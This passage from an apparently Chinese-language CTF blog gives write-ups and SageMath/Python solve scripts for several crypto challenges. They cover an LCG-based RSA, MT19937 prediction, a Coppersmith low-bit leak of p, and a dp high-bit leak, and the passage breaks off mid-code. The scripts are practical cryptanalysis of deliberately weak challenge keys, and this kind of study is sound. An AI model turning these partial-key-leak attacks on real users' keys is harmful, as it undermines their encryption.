p.close()</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;kalmar&#123;At_least_it_wasnt_lattices_right???!?&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://picx.zhimg.com/80/v2-2f0a7e2ca653e85402ba8c351ccf9640_1440w.png" alt=""><br>这图片起到了一定的迷惑作用，我还以为要构造格才做的出来，我寻思着我这格构造的好像也不怎么行啊，而且这么多组数据，要怎么整呢，然后就看到<strong>春哥</strong>做出来了，牛批！！！</p><p>所以上面其实是我看了春哥写的文档之后，思考了一番(过程应该没问题)，觉得挺有意思的记录一下OvO</p><h1 id="TPCTF2025-randomized-random-待专研"><a href="#TPCTF2025-randomized-random-待专研" class="headerlink" title="TPCTF2025 - randomized random(待专研)"></a>TPCTF2025 - randomized random(待专研)</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># FROM python:3</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag=f.read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">64</span>):</span><br><span class="line">    <span class="built_in">print</span>(random.getrandbits(<span class="number">32</span>)+flag[random.getrandbits(<span class="number">32</span>)%<span class="built_in">len</span>(flag)])</span><br><span class="line">    <span class="built_in">input</span>()</span><br></pre></td></tr></table></figure><p>看到<code>getrandbits</code>，可以立马想到<code>MT19937</code>，这里的话因为两个随机数“加”起来了，我们不好处理，但是可以看做是我们可以得到不连续的随机数中的高24位，但看了师傅们的wp都说了实际测试发现影响到了低20位，所以取得是高12位</p><p>然后就是<a href="https://huangx607087.online/2021/07/10/Explore-MT19937/">不连续的MT19937</a></p><p>待我有空再钻研钻研</p><h1 id="2024第四届长城杯-RandomRSA-未完待续"><a href="#2024第四届长城杯-RandomRSA-未完待续" class="headerlink" title="2024第四届长城杯 - RandomRSA(未完待续)"></a>2024第四届长城杯 - RandomRSA(未完待续)</h1><blockquote><p>题目描述：A特工从敌方服务器获取到了一份带有hint的机密文件，请协助破解加密。</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, p, a, b</span>):</span><br><span class="line">        self.p = p</span><br><span class="line">        self.a = a</span><br><span class="line">        self.b = b</span><br><span class="line">        self.x = random.randint(<span class="number">0</span>, p-<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(self.p, self.a, self.b)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        self.x = (self.a*self.x+self.b) % self.p</span><br><span class="line">        <span class="keyword">return</span> self.x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPrimes</span>(<span class="params">bits, k</span>):</span><br><span class="line">    p = getPrime(bits)</span><br><span class="line">    a = random.randint(<span class="number">0</span>, p-<span class="number">1</span>)</span><br><span class="line">    b = random.randint(<span class="number">0</span>, p-<span class="number">1</span>)</span><br><span class="line">    l = LCG(p, a, b)</span><br><span class="line">    <span class="keyword">return</span> [gmpy2.next_prime(l.<span class="built_in">next</span>()) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(k)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p, q = getPrimes(<span class="number">1024</span>, <span class="number">2</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(n, c)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 170302223332374952785269454020752010235000449292324018706323228421794605831609342383813680059406887437726391567716617403068082252456126724116360291722050578106527815908837796377811535800753042840119867579793401648981916062128752925574017615120362457848369672169913701701169754804744410516724429370808383640129</span></span><br><span class="line"><span class="string">a = 95647398016998994323232737206171888899957187357027939982909965407086383339418183844601496450055752805846840966207033179756334909869395071918100649183599056695688702272113280126999439574017728476367307673524762493771576155949866442317616306832252931038932232342396406623324967479959770751756551238647385191314</span></span><br><span class="line"><span class="string">b = 122891504335833588148026640678812283515533067572514249355105863367413556242876686249628488512479399795117688641973272470884323873621143234628351006002398994272892177228185516130875243250912554684234982558913267007466946601210297176541861279902930860851219732696973412096603548467720104727887907369470758901838</span></span><br><span class="line"><span class="string">n = 5593134172275186875590245131682192688778392004699750710462210806902340747682378400226605648011816039948262008066066650657006955703136928662067931212033472838067050429624395919771757949640517085036958623280188133965150285410609475158882527926240531113060812228408346482328419754802280082212250908375099979058307437751229421708615341486221424596128137575042934928922615832987202762651904056934292682021963290271144473446994958975487980146329697970484311863524622696562094720833240915154181032649358743041246023013296745195478603299127094103448698060367648192905729866897074234681844252549934531893172709301411995941527</span></span><br><span class="line"><span class="string">c = 2185680728108057860427602387168654320024588536620246138642042133525937248576850574716324994222027251548743663286125769988360677327713281974075574656905916643746842819251899233266706138267250441832133068661277187507427787343897863339824140927640373352305007520681800240743854093190786046280731148485148774188448658663250731076739737801267702682463265663725900621375689684459894544169879873344003810307496162858318574830487480360419897453892053456993436452783099460908947258094434884954726862549670168954554640433833484822078996925040310316609425805351183165668893199137911145057639657709936762866208635582348932189646</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>$x\equiv ax+b\%p$<br>$p’\equiv(x+k1)\%p$<br>$q’\equiv(ax+b+k2)\%p$<br>$p’*q’-n\equiv ax^{2}+(b+k2+ak1)x+bk1+k1k2-n\equiv0\%p$<br><code>abpn</code>已知，<code>k1k2</code>是小数可爆破，那就解<code>x</code>的一元二次方程即可</p><p>这里得开多线程搞一手……</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><blockquote><p><a href="https://tover.xyz/p/2024-ccb-RandomRSA/">https://tover.xyz/p/2024-ccb-RandomRSA/</a><br><a href="http://www.andynoel.xyz/?p=904">http://www.andynoel.xyz/?p=904</a><br><a href="https://blog.csdn.net/Jayjay___/article/details/142059111">https://blog.csdn.net/Jayjay___/article/details/142059111</a></p></blockquote><h1 id="TGCTF2025-EZRSA"><a href="#TGCTF2025-EZRSA" class="headerlink" title="TGCTF2025 - EZRSA"></a>TGCTF2025 - EZRSA</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag, get_random_emojiiiiii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genarate_emojiiiiii_prime</span>(<span class="params">nbits, base=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(base // <span class="number">32</span> * <span class="number">32</span>) <span class="keyword">if</span> base &gt;= <span class="number">3</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbits // <span class="number">8</span> // <span class="number">4</span> - base // <span class="number">32</span>):</span><br><span class="line">            p = (p &lt;&lt; <span class="number">32</span>) + get_random_emojiiiiii()  <span class="comment"># 猜一猜</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag.encode(</span><br><span class="line">) + <span class="string">&quot;&quot;</span>.join([long_to_bytes(get_random_emojiiiiii()).decode() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]).encode())</span><br><span class="line">p = genarate_emojiiiiii_prime(<span class="number">512</span>, <span class="number">224</span>)</span><br><span class="line">q = genarate_emojiiiiii_prime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="string">&quot;💯&quot;</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, bytes_to_long(e.encode()), n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p0 =&quot;</span>, long_to_bytes(p % <span class="number">2</span> ** <span class="number">256</span>).decode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"><span class="comment"># p0 = 😘😾😂😋😶😾😳😷</span></span><br><span class="line"><span class="comment"># n = 156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579</span></span><br><span class="line"><span class="comment"># c = 47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401</span></span><br></pre></td></tr></table></figure><p>可以看到<code>p</code>相当于一个<strong>224位的素数拼接9个emoji符号</strong>而来，而<code>get_random_emojiiiiii()</code>这个函数我们未知</p><p>这里是<strong>p的低位泄露攻击</strong>，我们知道了<strong>p一半的位数</strong>，尝试后我们可以发现<strong>256位</strong>似乎不够我们进行攻击</p><p>(部分情况下，1024位需要知道<strong>576比特位</strong>，512位需要知道<strong>288比特位</strong>，有的又是需要256位再<strong>多一个字节</strong>，d的泄露需要知道至少<strong>1/4的比特位</strong>，视情况而定吧)</p><p>可以看到<code>p</code>的<strong>低8字节</strong>已经给出，而我们还可以再爆破出<strong>高一个字节</strong>，查阅<a href="https://apps.timwhitlock.info/emoji/tables/unicode">emoji符号的范围</a>，我们得到以下脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">e = bytes_to_long(<span class="string">&quot;💯&quot;</span>.encode())</span><br><span class="line">p0 = bytes_to_long(<span class="string">&quot;😘😾😂😋😶😾😳😷&quot;</span>.encode())</span><br><span class="line">n = <span class="number">156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">0xf09f9880</span>,<span class="number">0xf09f998f</span>):</span><br><span class="line">    p00 = i*<span class="number">2</span>^<span class="number">256</span> + p0</span><br><span class="line">    f = x*<span class="number">2</span>^<span class="number">288</span>+p00</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X = <span class="number">2</span>**<span class="number">224</span>,beta=<span class="number">0.4</span>,epsilon=<span class="number">0.02</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:       </span><br><span class="line">        p = <span class="built_in">int</span>(roots[<span class="number">0</span>])*<span class="number">2</span>^<span class="number">288</span> + p00</span><br><span class="line">        q = n // p</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;p = &#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;q = &#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>然后就是$e与\phi 不互素$，上板子即可</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.parallel.multiprocessing_sage <span class="keyword">import</span> parallel_iter    <span class="comment"># TODO</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nth_p</span>(<span class="params">y, n, p, k=<span class="number">1</span></span>):</span><br><span class="line">  <span class="keyword">assert</span> is_pseudoprime(p)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[LOG] Solving pi = %s^%d&#x27;</span> % (<span class="built_in">hex</span>(p), k))</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    xs = Zmod(p**k)(y).nth_root(n, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    xs = GF(p**k)(y).nth_root(n, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">  xs = <span class="built_in">list</span>(<span class="built_in">set</span>(xs))</span><br><span class="line">  xs = [Integer(x) <span class="keyword">for</span> x <span class="keyword">in</span> xs]</span><br><span class="line">  <span class="keyword">return</span> xs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nthRSA_p</span>(<span class="params">c, e, p, k=<span class="number">1</span></span>):</span><br><span class="line">  <span class="keyword">assert</span> is_pseudoprime(p)</span><br><span class="line">  P = Integer(<span class="built_in">pow</span>(p, k))</span><br><span class="line">  phi = euler_phi(P)</span><br><span class="line"></span><br><span class="line">  rs = []</span><br><span class="line">  ei = e</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = gcd(phi, ei)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    rs += [r]</span><br><span class="line">    ei //= r</span><br><span class="line">  r = product(rs)</span><br><span class="line">  dr = (e // r).inverse_mod(phi)</span><br><span class="line">  cr = <span class="built_in">pow</span>(c, dr, P)</span><br><span class="line">  <span class="keyword">return</span> nth_p(cr, r, p, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nthRSA_n</span>(<span class="params">c, e, ps, ks=<span class="literal">None</span>, checker=<span class="literal">None</span>, ret1=<span class="literal">False</span></span>):</span><br><span class="line">  <span class="comment"># ps: p, q, ...</span></span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">isinstance</span>(ps, <span class="built_in">list</span>)</span><br><span class="line">  <span class="keyword">if</span> ks == <span class="literal">None</span>:</span><br><span class="line">    ks = [<span class="number">1</span>] * <span class="built_in">len</span>(ps)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(ps) == <span class="built_in">len</span>(ks)</span><br><span class="line">  ms = []</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ps)):</span><br><span class="line">    mp = nthRSA_p(c, e, ps[i], ks[i])</span><br><span class="line">    ms += [mp]</span><br><span class="line">  total = product([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ms])</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[Log] Doing crt.\nComplexity = %d: %s&#x27;</span> % (total, <span class="built_in">str</span>([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ms])))</span><br><span class="line"></span><br><span class="line">  res = []</span><br><span class="line">  Ps = [ps[i]**ks[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ps))]</span><br><span class="line">  <span class="keyword">for</span> msi <span class="keyword">in</span> tqdm(itertools.product(*ms), total=total):</span><br><span class="line">    m = crt(<span class="built_in">list</span>(msi), Ps)</span><br><span class="line">    <span class="keyword">if</span> checker == <span class="literal">None</span>:</span><br><span class="line">      res += [m]</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> checker(m):</span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> ret1:</span><br><span class="line">        res += [m]</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">return</span> m</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genHeaderChecker</span>(<span class="params">hd</span>):</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">isinstance</span>(hd, <span class="built_in">str</span>):</span><br><span class="line">    hd = hd.encode()</span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">isinstance</span>(hd, <span class="built_in">bytes</span>)</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">checkHeader</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">      <span class="keyword">if</span> hd <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> checkHeader</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genStrChecker</span>(<span class="params"><span class="built_in">dict</span>, n=<span class="number">65537</span></span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">checkStr</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      flag = long_to_bytes(<span class="built_in">int</span>(m)).decode()</span><br><span class="line">      <span class="keyword">for</span> fi <span class="keyword">in</span> flag[:n]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> fi <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">      <span class="built_in">print</span>(flag)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> checkStr</span><br><span class="line"></span><br><span class="line">p = <span class="number">12424840247075830662687097292458444573014198016321428995092662043898159667123240573630892907827505266982898641483333170032514244713840745287869771915696311</span></span><br><span class="line">q = <span class="number">12602471198163266643743702664647336358595911975665358584258749238146841559843060594842063473155049870396568542257767865369797827796765830093256146584311989</span></span><br><span class="line">e = bytes_to_long(<span class="string">&quot;💯&quot;</span>.encode())</span><br><span class="line">n = <span class="number">156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579</span></span><br><span class="line">c = <span class="number">47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401</span></span><br><span class="line"></span><br><span class="line">ps = [p, q]</span><br><span class="line">checker = genHeaderChecker(<span class="string">&#x27;TGCTF&#x27;</span>)</span><br><span class="line">res = nthRSA_n(c, e, ps, checker=checker)</span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> res:</span><br><span class="line">  flag = long_to_bytes(<span class="built_in">int</span>(r))</span><br><span class="line">  <span class="built_in">print</span>(flag.decode())</span><br><span class="line"><span class="comment"># TGCTF&#123;🙇🏮🤟_🫡🫡🫡_🚩🚩🚩&#125;😃😖😘😨😢</span></span><br></pre></td></tr></table></figure><h1 id="LitCTF2025-leak-dp高位泄露广义解法"><a href="#LitCTF2025-leak-dp高位泄露广义解法" class="headerlink" title="LitCTF2025 - leak(dp高位泄露广义解法)"></a>LitCTF2025 - leak(dp高位泄露广义解法)</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p,q,e = getPrime(<span class="number">1024</span>),getPrime(<span class="number">1024</span>),getPrime(<span class="number">101</span>)</span><br><span class="line">n = p*q</span><br><span class="line">temp = gmpy2.invert(e,p-<span class="number">1</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">hint = temp&gt;&gt;<span class="number">180</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;hint = <span class="subst">&#123;hint&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">e = 1915595112993511209389477484497</span></span><br><span class="line"><span class="string">n = 12058282950596489853905564906853910576358068658769384729579819801721022283769030646360180235232443948894906791062870193314816321865741998147649422414431603039299616924238070704766273248012723702232534461910351418959616424998310622248291946154911467931964165973880496792299684212854214808779137819098357856373383337861864983040851365040402759759347175336660743115085194245075677724908400670513472707204162448675189436121439485901172477676082718531655089758822272217352755724670977397896215535981617949681898003148122723643223872440304852939317937912373577272644460885574430666002498233608150431820264832747326321450951</span></span><br><span class="line"><span class="string">c = 5408361909232088411927098437148101161537011991636129516591281515719880372902772811801912955227544956928232819204513431590526561344301881618680646725398384396780493500649993257687034790300731922993696656726802653808160527651979428360536351980573727547243033796256983447267916371027899350378727589926205722216229710593828255704443872984334145124355391164297338618851078271620401852146006797653957299047860900048265940437555113706268887718422744645438627302494160620008862694047022773311552492738928266138774813855752781598514642890074854185464896060598268009621985230517465300289580941739719020511078726263797913582399</span></span><br><span class="line"><span class="string">hint = 10818795142327948869191775315599184514916408553660572070587057895748317442312635789407391509205135808872509326739583930473478654752295542349813847128992385262182771143444612586369461112374487380427668276692719788567075889405245844775441364204657098142930</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>$e<em>dp\equiv 1(mod\ p-1)$<br>$e</em>(dp_high+x)=k<em>(p-1)+1$<br>$e</em>(dp_high+x)+k-1\equiv 0(mod\ p)$<br>因为这里<code>e</code>太大了，我们打不了<a href="https://www.cnblogs.com/vconlln/p/17066500.html">一元copper</a>，那就直接打<strong>二元copper</strong></p><p>奇怪的是，<code>m</code>代表移位位数，<code>d</code>代表多项式的最高次幂，但这里只能为3才能跑出<code>flag</code>(已经默认跑13了)</p><p>$2^{e<em>dp}\equiv 2(mod\ p)$<br>$p=GCD(2^{e</em>dp}-2,n)$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">e = <span class="number">1915595112993511209389477484497</span></span><br><span class="line">n = <span class="number">12058282950596489853905564906853910576358068658769384729579819801721022283769030646360180235232443948894906791062870193314816321865741998147649422414431603039299616924238070704766273248012723702232534461910351418959616424998310622248291946154911467931964165973880496792299684212854214808779137819098357856373383337861864983040851365040402759759347175336660743115085194245075677724908400670513472707204162448675189436121439485901172477676082718531655089758822272217352755724670977397896215535981617949681898003148122723643223872440304852939317937912373577272644460885574430666002498233608150431820264832747326321450951</span></span><br><span class="line">c = <span class="number">5408361909232088411927098437148101161537011991636129516591281515719880372902772811801912955227544956928232819204513431590526561344301881618680646725398384396780493500649993257687034790300731922993696656726802653808160527651979428360536351980573727547243033796256983447267916371027899350378727589926205722216229710593828255704443872984334145124355391164297338618851078271620401852146006797653957299047860900048265940437555113706268887718422744645438627302494160620008862694047022773311552492738928266138774813855752781598514642890074854185464896060598268009621985230517465300289580941739719020511078726263797913582399</span></span><br><span class="line">hint = <span class="number">10818795142327948869191775315599184514916408553660572070587057895748317442312635789407391509205135808872509326739583930473478654752295542349813847128992385262182771143444612586369461112374487380427668276692719788567075889405245844775441364204657098142930</span></span><br><span class="line">leak = hint &lt;&lt; <span class="number">180</span></span><br><span class="line">PR.&lt;x,y&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">f = e*(leak + x) + y -<span class="number">1</span></span><br><span class="line">res = small_roots(f, (<span class="number">2</span>^<span class="number">180</span>,<span class="number">2</span>^e.bit_length()),m=<span class="number">1</span>,d=<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> res:</span><br><span class="line">    dp = leak + root[<span class="number">0</span>]</span><br><span class="line">    p = GCD(<span class="built_in">pow</span>(<span class="number">2</span>, e*dp, n) -<span class="number">2</span>, n)</span><br><span class="line">    q = n // p</span><br><span class="line">    d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(m).decode())</span><br></pre></td></tr></table></figure><h1 id="NepCTF2025-ezRSA2"><a href="#NepCTF2025-ezRSA2" class="headerlink" title="NepCTF2025 - ezRSA2"></a>NepCTF2025 - ezRSA2</h1><blockquote><p>Easy RSA, easy strategy. No need to brute force.<br>Perhaps it’s easier than ezRSA in NepCTF 2024.</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getStrongPrime, getRandomNBitInteger, GCD, inverse, long_to_bytes, bytes_to_long, sieve_base</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_parameters</span>(<span class="params">gamma=<span class="number">0.33</span>, beta=<span 